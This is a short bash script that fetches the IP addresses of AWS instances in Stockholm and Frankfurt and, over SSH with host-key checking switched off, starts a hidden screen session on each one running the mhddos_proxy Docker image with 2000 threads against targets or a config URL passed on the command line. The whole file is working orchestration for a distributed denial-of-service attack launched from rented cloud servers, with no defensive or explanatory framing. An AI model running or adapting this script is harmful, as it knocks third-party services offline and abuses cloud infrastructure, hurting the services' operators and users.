#!/bin/bash

main(){
	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`
	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`

	for ip in ${STOCKHOLM_INSTANCES_IPS}
	do
		fire "key-stockholm-0.pem" ${ip} ${@} &
	done

	for ip in ${FRANKFURT_INSTANCES_IPS}
	do
		fire "key-frankfurt-0.pem" ${ip} ${@} &
	done

	wait
}

fire(){
	local KEY=${1}
	local IP=${2}
	shift 2

	for p in ${@}
	do
		[[ ${p} == "-c" ]] &&
		shift &&
		CONFIG_URL=${1} &&
		break
	done

	echo "    fires from ${IP}"

	[[ -z ${CONFIG_URL} ]] &&
	ssh \
		-o LogLevel=ERROR \
		-i ${KEY} \
		-o "StrictHostKeyChecking no" \
		-o "UserKnownHostsFile /dev/null" \
		"ubuntu@${IP}" \
			screen -dm \
				sudo docker run \
					-it \
					--rm \
					--pull always portholeascend/mhddos_proxy:latest \
					--debug \
					-t 2000 \
					${@} ||
	ssh \
		-o LogLevel=ERROR \
		-i ${KEY} \
		-o "StrictHostKeyChecking no" \
		-o "UserKnownHostsFile /dev/null" \
		"ubuntu@${IP}" \
			screen -dm \
				sudo docker run \
					-it \
					--rm \
					--pull always portholeascend/mhddos_proxy:latest \
					--debug \
					-t 2000 \
					-c ${@}
}

./checkAWS.sh && main ${@} || ./awsCliNa.sh


